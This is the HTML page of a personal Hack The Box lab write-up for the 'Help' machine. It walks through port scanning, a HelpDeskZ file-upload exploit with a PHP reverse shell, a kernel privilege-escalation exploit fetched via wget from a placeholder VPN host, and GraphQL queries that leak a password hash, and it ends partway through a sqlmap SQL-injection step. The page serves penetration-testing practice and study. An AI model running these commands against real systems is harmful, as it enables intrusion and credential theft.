@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="10.129.230.159 OS: Ubuntu Credentials: Username Password Notes/Hash Shiv from http://help.htb:3000 Attack &#43; Enum Vectors: (Ports, etc.) Check HTTP Enum Metho TCP 3000: HTTP; Node.js Express framework? TCP 80: HTTP: Apache 2.4.18
+TCP 22: SSH
+UDP (161 SNMP)? UDP 161: closed
+nmap results: scan twice (esp winRM) # Nmap 7.99 scan initiated Mon Jun 1 16:10:36 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Help 10.129.230.159 Nmap scan report for 10.129.230.159 Host is up, received echo-reply ttl 63 (0.018s latency). Scanned at 2026-06-01 16:10:37 EDT for 28s Not shown: 64490 closed tcp ports (reset), 1042 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv&#43;ds8nS7Mva9e9ztlad/fzBlyBpkiYxty&#43;peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8&#43;D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/ | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis= | 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 |_http-title: Did not follow redirect to http://help.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) 3000/tcp open http syn-ack ttl 63 Node.js Express framework |_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Enum Notes: Web Service: Gobuster / fuff Going in to http://10.129.230.159 it redirected to help.htb. Let&rsquo;s update our /etc/hosts with 10.129.230.159 to help.htb
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/htb-writeup/help/" />
+
+
+    <title>
+        
+            Help :: Freedie | Pentration Testing Lab Writeups 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.7289daf2e88ea2c7b253a51cc5794c7cc17e7aeb7295a19d978db764a5862f25.css" integrity="sha256-cona8uiOoseyU6UcxXlMfMF&#43;eutylaGdl423ZKWGLyU=" crossorigin="anonymous">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="css/custom.css">
+    
+
+
+<link rel="icon" type="image/x-icon" href="/favicon.ico">
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+
+
+
+  <meta itemprop="name" content="Help">
+  <meta itemprop="description" content="10.129.230.159 OS: Ubuntu Credentials: Username Password Notes/Hash Shiv from http://help.htb:3000 Attack &#43; Enum Vectors: (Ports, etc.) Check HTTP Enum Metho TCP 3000: HTTP; Node.js Express framework? TCP 80: HTTP: Apache 2.4.18
+TCP 22: SSH
+UDP (161 SNMP)? UDP 161: closed
+nmap results: scan twice (esp winRM) # Nmap 7.99 scan initiated Mon Jun 1 16:10:36 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Help 10.129.230.159 Nmap scan report for 10.129.230.159 Host is up, received echo-reply ttl 63 (0.018s latency). Scanned at 2026-06-01 16:10:37 EDT for 28s Not shown: 64490 closed tcp ports (reset), 1042 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv&#43;ds8nS7Mva9e9ztlad/fzBlyBpkiYxty&#43;peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8&#43;D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/ | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis= | 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 |_http-title: Did not follow redirect to http://help.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) 3000/tcp open http syn-ack ttl 63 Node.js Express framework |_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Enum Notes: Web Service: Gobuster / fuff Going in to http://10.129.230.159 it redirected to help.htb. Let’s update our /etc/hosts with 10.129.230.159 to help.htb">
+  <meta itemprop="datePublished" content="2026-06-01T23:49:11-04:00">
+  <meta itemprop="dateModified" content="2026-06-01T23:49:11-04:00">
+  <meta itemprop="wordCount" content="1683">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Help">
+  <meta name="twitter:description" content="10.129.230.159 OS: Ubuntu Credentials: Username Password Notes/Hash Shiv from http://help.htb:3000 Attack &#43; Enum Vectors: (Ports, etc.) Check HTTP Enum Metho TCP 3000: HTTP; Node.js Express framework? TCP 80: HTTP: Apache 2.4.18
+TCP 22: SSH
+UDP (161 SNMP)? UDP 161: closed
+nmap results: scan twice (esp winRM) # Nmap 7.99 scan initiated Mon Jun 1 16:10:36 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Help 10.129.230.159 Nmap scan report for 10.129.230.159 Host is up, received echo-reply ttl 63 (0.018s latency). Scanned at 2026-06-01 16:10:37 EDT for 28s Not shown: 64490 closed tcp ports (reset), 1042 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv&#43;ds8nS7Mva9e9ztlad/fzBlyBpkiYxty&#43;peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8&#43;D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/ | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis= | 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 |_http-title: Did not follow redirect to http://help.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) 3000/tcp open http syn-ack ttl 63 Node.js Express framework |_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Enum Notes: Web Service: Gobuster / fuff Going in to http://10.129.230.159 it redirected to help.htb. Let’s update our /etc/hosts with 10.129.230.159 to help.htb">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2026-06-01 23:49:11 -0400 EDT" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner">
+                <li><a href="/about/">About</a></li>
+            
+                <li><a href="/blogs/">Blogs</a></li>
+            
+                <li><a href="/htb-writeups/">HTB Writeups</a></li>
+            
+                <li><a href="/tags/">Tags</a></li>
+            
+    </ul>
+</nav>
+
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+        </span>
+    </span>
+</header>
+
+
+            
+    <div class="content">
+        <main class="post">
+
+            <div class="post-info">
+                
+                </p>
+            </div>
+
+            <article>
+                <h2 class="post-title"><a href="http://localhost:1313/htb-writeup/help/">Help</a></h2>
+
+                
+                
+                
+
+                <div class="post-content">
+                    <pre tabindex="0"><code class="language-IP" data-lang="IP">10.129.230.159
+</code></pre><h1 id="os-ubuntu">OS: Ubuntu</h1>
+<h1 id="credentials">Credentials:</h1>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+          <th>Notes/Hash</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Shiv</td>
+          <td></td>
+          <td>from <code>http://help.htb:3000</code></td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h1 id="attack--enum-vectors-ports-etc-check-http-enum-metho">Attack + Enum Vectors: (Ports, etc.) Check HTTP Enum Metho</h1>
+<p>TCP 3000: HTTP; Node.js Express framework?
+TCP 80: HTTP: Apache 2.4.18</p>
+<p>TCP 22: SSH</p>
+<h2 id="udp-161-snmp">UDP (161 SNMP)?</h2>
+<p>UDP 161: closed</p>
+<hr>
+<h1 id="nmap-results-scan-twice-esp-winrm"><code>nmap</code> results: scan twice (esp winRM)</h1>
+<pre tabindex="0"><code># Nmap 7.99 scan initiated Mon Jun  1 16:10:36 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Help 10.129.230.159
+Nmap scan report for 10.129.230.159
+Host is up, received echo-reply ttl 63 (0.018s latency).
+Scanned at 2026-06-01 16:10:37 EDT for 28s
+Not shown: 64490 closed tcp ports (reset), 1042 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
+|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
+80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
+|_http-title: Did not follow redirect to http://help.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
+|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+</code></pre><hr>
+<h1 id="service-enum-notes">Service Enum Notes:</h1>
+<h3 id="web-service-gobuster--fuff">Web Service: <code>Gobuster</code> / <code>fuff</code></h3>
+<p>Going in to <code>http://10.129.230.159</code> it redirected to <code>help.htb</code>.
+Let&rsquo;s update our <code>/etc/hosts</code> with <code>10.129.230.159</code> to <code>help.htb</code></p>
+<p><code>http://help.htb/</code> showed default apache2 ubuntu page</p>
+<p>Now let&rsquo;s view <code>http://help.htb:3000/</code>
+Yield a message in <code>json</code> format:</p>
+<pre tabindex="0"><code>{&#34;message&#34;:&#34;Hi Shiv, To get access please find the credentials with given query&#34;}
+</code></pre><p>Now we possible have a username <code>Shiv</code>, let&rsquo;s add that to our credential table</p>
+<p>Let&rsquo;s try spraying <code>Shiv:Shiv</code> first onto ssh: no luck.</p>
+<p>Okay let&rsquo;s do some <code>gobuster</code>-ing then: first let&rsquo;s try on the non-default port 3000</p>
+<pre tabindex="0"><code>gobuster dir -u http://help.htb:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -r -b 403,404
+</code></pre><p>yields nothing interesting</p>
+<pre tabindex="0"><code>gobuster dir -u http://help.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -r -b 403,404
+</code></pre><p>which yields:</p>
+<pre tabindex="0"><code>support              (Status: 200) [Size: 4413]
+</code></pre><p>visiting <code>http://help.htb/support</code>
+we see we are at <code>helpdeskz</code> software appearantly.</p>
+<p>Now let&rsquo;s run gobuster on the <code>/support</code> directory</p>
+<pre tabindex="0"><code>gobuster dir -u http://help.htb/support -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -r -b 403,404
+</code></pre><p>got some results:</p>
+<pre tabindex="0"><code>uploads              (Status: 200) [Size: 11321]
+css                  (Status: 200) [Size: 0]
+includes             (Status: 200) [Size: 11321]
+js                   (Status: 200) [Size: 11321]
+views                (Status: 200) [Size: 11321]
+images               (Status: 200) [Size: 0]
+controllers          (Status: 200) [Size: 11321]
+</code></pre><p>viewing them, we got redirected to home page, let&rsquo;s move forward first</p>
+<hr>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<p>Alright then let&rsquo;s play around with the <code>/support</code> page
+so searching <code>helpdeskz</code>: we found out that they have a github page
+<a href="https://github.com/helpdesk-z/helpdeskz-dev">https://github.com/helpdesk-z/helpdeskz-dev</a>
+confirming with what we gobuster&rsquo;d results showed above, it is likely the web application used.</p>
+<p>Now they do have a <code>README.md</code> file; which contains the version number, going to</p>
+<pre tabindex="0"><code>http://help.htb/support/README.md
+</code></pre><p>it revealed that the <code>helpdeskz</code> version is 1.0.2! Look up for exploits on google
+<a href="https://www.exploit-db.com/exploits/40300">https://www.exploit-db.com/exploits/40300</a> We found this exploit that can upload an arbitrary file:
+then we mirror the exploit</p>
+<pre tabindex="0"><code>searchsploit -m 40300
+</code></pre><p>and running:</p>
+<pre tabindex="0"><code>python2 40300.py http://help.htb/support/ php-reverse-shell.php 
+</code></pre><p>it returned:</p>
+<pre tabindex="0"><code>Sorry, I did not find anything
+</code></pre><p>I got a bit stuck here; then watched <a href="https://www.youtube.com/watch?v=XB8CbhfOczU">ippsec</a> video on this box for some hints, turned out maybe the time of the target box was different than ours? Now I am not as skilled to modify the python script that much as of the moment, but I do want to continue with the box. (I will come back to trying to modify the exploit myself later)</p>
+<p>I have decided to sync my time manually: after some research and using this site:
+<a href="https://everytimezone.com/">https://everytimezone.com/</a>
+I figured out that the time zone is UTC time. Turn off NTP:</p>
+<pre tabindex="0"><code>timedatectl set-ntp 0
+</code></pre><p>change our time zone to UTC:</p>
+<pre tabindex="0"><code>sudo timedatectl set-timezone UTC
+</code></pre><p>then running the exploit again:</p>
+<pre tabindex="0"><code>sudo nc -lvnp 1337
+</code></pre><pre tabindex="0"><code>python2 40300.py http://help.htb/support/ php-reverse-shell.php 
+</code></pre><p>Interestingly also didn&rsquo;t show up anything. Assuming that we already fixed the time issue, then it could be our reverse shell issue?</p>
+<p>Re-reading the exploit we saw that we actually had to submit a ticket with our <code>.php</code> reverese shell as attachments. Then appearantly we can run it again? Running the exploit again nothing happened. Interesting&hellip; Then watching <a href="https://www.youtube.com/watch?v=XB8CbhfOczU">ippsec</a> again; appearantly he was using <code>http://help.htb/support/uploads/tickets</code> which in interesting since the exploit specified to use <code>baseURL</code>.</p>
+<p>Doing some research and reading <a href="https://0xdf.gitlab.io/2019/06/08/htb-help.html#source-analysis">0xdf</a> walkthrough in turned out the version <code>1.0.2</code> of helpdeskz stored any uploads to <code>/uploads/tickets</code>, which I wasn&rsquo;t able to find in <a href="https://github.com/helpdesk-z/helpdeskz-dev">https://github.com/helpdesk-z/helpdeskz-dev</a></p>
+<p>Fortunately though, I found the old version of <code>1.0.2</code> old github with some digging on google: <a href="https://github.com/ViktorNova/HelpDeskZ">https://github.com/ViktorNova/HelpDeskZ</a> and git cloning it and running:</p>
+<pre tabindex="0"><code>grep -ri &#34;uploads/&#34;
+</code></pre><p>it showed that</p>
+<pre tabindex="0"><code>install/install.php:    $attach_dir = HELPDESKZ_PATH . &#39;uploads/tickets&#39;;
+</code></pre><p>perfect! this is another thing we learn from this box.</p>
+<p>alright, without further ado let&rsquo;s run the exploit again:</p>
+<pre tabindex="0"><code>python2 40300.py http://help.htb/support/uploads/tickets php-reverse-shell.php 
+</code></pre><p>this time we got in! Let&rsquo;s now upgrade our shell</p>
+<hr>
+<h1 id="priv-esc">Priv Esc</h1>
+<p>After some enumeration:</p>
+<pre tabindex="0"><code>uname -a
+</code></pre><p>we found that the linux version <code>4.4.0-116</code> is vulnerable to kernel exploits.</p>
+<p>I&rsquo;ve actually encountered one before I believe it&rsquo;s vulnerable to: <a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a>. But I decided to try the kernel exploit that <code>ippsec</code> did:
+<a href="https://www.exploit-db.com/exploits/44298">https://www.exploit-db.com/exploits/44298</a></p>
+<p>I&rsquo;ve tried the Virtual Hacking Labs trick by compiling the exploit with <code>-static</code>:</p>
+<pre tabindex="0"><code>gcc -static 44298.c -o test
+</code></pre><p>but running it did not work for some reason on the target&hellip;</p>
+<p>After some struggling: I found that I can compile it on the target and running it works. So let&rsquo;s transfer the exploit to target. On target:</p>
+<pre tabindex="0"><code>wget http://HTB_VPN_IP/44298.c
+</code></pre><pre tabindex="0"><code>gcc 44298.c -o test
+</code></pre><pre tabindex="0"><code>chmod +x test
+</code></pre><pre tabindex="0"><code>./test
+</code></pre><p>We got root!</p>
+<p>Therefore pwn&rsquo;d.</p>
+<h1 id="ps">P.S.</h1>
+<p>Remember to change back the time zone of our kali, for my case:</p>
+<pre tabindex="0"><code>timedatectl set-ntp 1
+</code></pre><pre tabindex="0"><code>sudo timedatectl set-timezone America/New_York
+</code></pre><hr>
+<h1 id="conclusion--remediation">Conclusion &amp; Remediation</h1>
+<p>This box was definitely not easy for me, but I had a lot of fun learning new methodologies that I get to add to my notes. For remediation, servers with <code>helpdeskz 1.0.2</code> should update it to the latest version. Also, developers should never allow for <code>.php</code> files upload with security by obscurity.</p>
+<h1 id="pushing-for-more">Pushing For More:</h1>
+<p>Okay, seems like there is actually another way to get initial access on this box using <code>SQLi</code>; since this is the first box I do after my OSCP exam, I want to practice <code>sqlmap</code> as it was not allowed on the OSCP exam. First let&rsquo;s go back to the enumeration of <code>http://help.htb:3000</code></p>
+<pre tabindex="0"><code>{&#34;message&#34;:&#34;Hi Shiv, To get access please find the credentials with given query&#34;}
+</code></pre><p>Appearantly by walkthrough if we google&rsquo;d <code>nodejs express query language</code> would have showed something hinting about <code>graphql</code>. However, I don&rsquo;t think this was very repeatable since I&rsquo;ve tried googling <code>nodejs express pentesting</code> or something similar before, but yields nothing related to <code>graphql</code>. The most logical thing that make sense to me is <code>query</code> must be used with some <code>language</code>? Anyhow, I will add <code>google query language</code> to my methodology whenever I see the keyword <code>query</code>.</p>
+<p>Now if we browsed it through the browser:</p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql
+</code></pre><p>returned</p>
+<pre tabindex="0"><code>GET query missing.
+</code></pre><p>which is non-default; in comparison to <code>http://help.htb:3000/help</code> yields</p>
+<pre tabindex="0"><code>Cannot GET /help
+</code></pre><p>Alright now how do we test this?</p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql?test
+</code></pre><p>we got:</p>
+<pre tabindex="0"><code>Must provide query string.
+</code></pre><p>let&rsquo;s try:</p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql?test=username
+</code></pre><p>still yield the same results</p>
+<pre tabindex="0"><code>Must provide query string.
+</code></pre><p>Maybe we have to literally use the <code>query</code> string?</p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql?query
+</code></pre><p>we got</p>
+<pre tabindex="0"><code>{&#34;errors&#34;:[{&#34;message&#34;:&#34;Syntax Error GraphQL request (1:1) Unexpected &lt;EOF&gt;\n\n1: \n   ^\n&#34;,&#34;locations&#34;:[{&#34;line&#34;:1,&#34;column&#34;:1}]}]}
+</code></pre><p>hmm I&rsquo;m confused, let&rsquo;s try supplying it with something since it returned <code>&lt;EOF&gt;</code> probably because we supplied empty string?</p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql?query=test
+</code></pre><p>yields</p>
+<pre tabindex="0"><code>{&#34;errors&#34;:[{&#34;message&#34;:&#34;Syntax Error GraphQL request (1:1) Unexpected Name \&#34;user\&#34;\n\n1: user\n   ^\n&#34;,&#34;locations&#34;:[{&#34;line&#34;:1,&#34;column&#34;:1}]}]}
+</code></pre><p>Im a little confused, let&rsquo;s do some googling, since the error said something about GraphQL syntax error? Let&rsquo;s google: <code>graphql query syntax</code>; returned this resource <a href="https://graphql.org/learn/queries/">https://graphql.org/learn/queries/</a>
+and with google AI overview i think we had to supply braces <code>{}</code> instead of <code>test</code></p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql?query={test}
+</code></pre><p>yields</p>
+<pre tabindex="0"><code>{&#34;errors&#34;:[{&#34;message&#34;:&#34;Cannot query field \&#34;test\&#34; on type \&#34;Query\&#34;.&#34;,&#34;locations&#34;:[{&#34;line&#34;:1,&#34;column&#34;:2}]}]}
+</code></pre><p>Okay so a different field? I think I am going the right way.</p>
+<p>After struggling for a bit I went to <a href="https://0xdf.gitlab.io/2019/06/08/htb-help.html#source-analysis">0xdf</a> walkthrough seeing that we had to supply <code>user</code>:</p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql?query={user}
+</code></pre><p>yields</p>
+<pre tabindex="0"><code>{&#34;errors&#34;:[{&#34;message&#34;:&#34;Field \&#34;user\&#34; of type \&#34;User\&#34; must have a selection of subfields. Did you mean \&#34;user { ... }\&#34;?&#34;,&#34;locations&#34;:[{&#34;line&#34;:1,&#34;column&#34;:2}]}]}
+</code></pre><p>Aha! Different results finally, now I think we have to supply one more braces <code>{}</code></p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql?query={user{user}}
+</code></pre><p>yields</p>
+<pre tabindex="0"><code>{&#34;errors&#34;:[{&#34;message&#34;:&#34;Cannot query field \&#34;user\&#34; on type \&#34;User\&#34;. Did you mean \&#34;username\&#34;?&#34;,&#34;locations&#34;:[{&#34;line&#34;:1,&#34;column&#34;:7}]}]}
+</code></pre><p>Alright seems like it&rsquo;s right! Let&rsquo;s query for username now:</p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql?query={user{username}}
+</code></pre><p>yields</p>
+<pre tabindex="0"><code>{&#34;data&#34;:{&#34;user&#34;:{&#34;username&#34;:&#34;helpme@helpme.com&#34;}}}
+</code></pre><p>Perfect! Now maybe we can get password?</p>
+<pre tabindex="0"><code>http://help.htb:3000/graphql?query={user{password}}
+</code></pre><p>yields</p>
+<pre tabindex="0"><code>{&#34;data&#34;:{&#34;user&#34;:{&#34;password&#34;:&#34;5d3c93182bb20f07b994a7f617e99cff&#34;}}}
+</code></pre><p>Alright now let&rsquo;s try to break the password;</p>
+<p>I don&rsquo;t know why leveraging <code>john</code> and <code>hashcat</code> I can&rsquo;t seem to crack it? And spraying it raw doesn&rsquo;t seem like correct password. Luckily using <a href="https://crackstation.net/">https://crackstation.net/</a> we got:</p>
+<pre tabindex="0"><code>godhelpmeplz
+</code></pre><p>Now we can finally log in to <code>http://help.htb/support/</code>, and leverage the other exploit:
+<a href="https://www.exploit-db.com/exploits/41200">https://www.exploit-db.com/exploits/41200</a></p>
+<p>So after a while trying to figure this out, I had to reference to <a href="https://0xdf.gitlab.io/2019/06/08/htb-help.html#source-analysis">0xdf</a> walkthrough since I am very weak with SQL injections: appearantly we have to upload an attachment and copy the URL of the attachment and leverage it with SQL injection. How it works is that <strong>if the query is valid it will return the attachment as a result</strong></p>
+<p>Now I learned something with <code>sqlmap</code>, we can intercept a request with <code>Burp Suite</code> and save it as a file. Then we can use <code>-r</code> flag of <code>sqlmap</code> to specify the exact request we want to test with. First I create a ticket and submit a <code>.jpg</code> file as attachment and copy the URL of the attachment. Then intercept the request and save it:</p>
+<pre tabindex="0"><code>GET /support/?v=view_tickets&amp;action=ticket&amp;param[]=5&amp;param[]=attachment&amp;param[]=1&amp;param[]=7 HTTP/1.1
+Host: help.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: lang=english; PHPSESSID=u4ufu9aq6ens0gndmfodm77862; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BFnENl6bkapNbXODkHwpUpKDdvbjtucCrbgZXtDhnnXOQ%3D%3D
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+</code></pre><p>Then using sqlmap: specifying <code>param[]</code> as the vulnerable parameter here</p>
